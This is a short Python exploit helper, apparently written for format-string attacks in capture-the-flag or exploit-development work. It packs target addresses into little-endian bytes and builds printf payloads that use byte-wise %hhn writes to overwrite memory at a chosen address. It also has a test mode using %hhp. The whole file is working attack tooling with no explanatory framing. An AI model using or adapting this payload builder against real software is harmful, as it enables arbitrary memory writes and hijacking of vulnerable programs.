from __future__ import print_function
import re

class Pointer:
    def __init__(self, ptr, size = 4):
        self.ptr = abs(int(ptr, 16))
        self.size = size
        if int(ptr, 16) < 0:
            self.sign = -1
        else:
            self.sign = 1

    def __int__(self):
        return self.sign * self.ptr

    def __repr__(self):
        ptr_str = hex(self.ptr)[2:]
        while len(ptr_str) < self.size*2:
            ptr_str = "0" + ptr_str

        ptr_str = "0x" + ptr_str

        if self.sign == -1:
            ptr_str = "-" + ptr_str

        return ptr_str

    def __str__(self):
        if self.sign == -1:
            raise ValueError("Str of negative pointer undefined")
        ptr_str = self.__repr__()[2:]
        parts = reversed([ptr_str[2*i:2*i+2] for i in range(len(ptr_str)//2)])
        codes = map(lambda x: int(x, 16), parts)
        chars = map(chr, codes)
        return "".join(chars)

    def __add__(self, other):
        val = int(self) + int(other)
        ptr = Pointer(hex(val), self.size)
        return ptr

    def __sub__(self, other):
        val = int(self) - int(other)
        ptr = Pointer(hex(val), self.size)
        return ptr

    def full_addr(self):
        result = ""
        for i in range(self.size):
            result += str(self + i)

        return result

    def __iter__(self):
        if self.sign == -1:
            raise ValueError("Str of negative pointer undefined")
        ptr_str = self.__repr__()[2:]
        for i in range(len(ptr_str) // 2):
            yield Pointer(ptr_str[2*i:2*i+2], 1)



def find_pointer(line, offset=Pointer("0x00")):
    m = re.search("0x[0-9a-f]+", line)
    if m:
        ptr = Pointer(m.group(0))
        return ptr + offset
    else:
        return None

def pointer_fmt(pointer, value, start_index, test=False):
    fmt = ""
    parts = enumerate(reversed(map(int, value)))
    parts = sorted(parts, key=lambda x: x[1])

    print(parts)

    total_val = 0

    start_index += 4*len(parts)

    for i, val in parts:
        to_add = val - total_val
        total_val = val

        if test:
            part = "%{0:03}hhc%{1:03}$hhp".format(to_add, start_index + i)
        else:
            part = "%{0:03}hhc%{1:03}$hhn".format(to_add, start_index + i)

        fmt += part

    fmt += "A" * len(parts)
    fmt += pointer.full_addr()

    return fmt
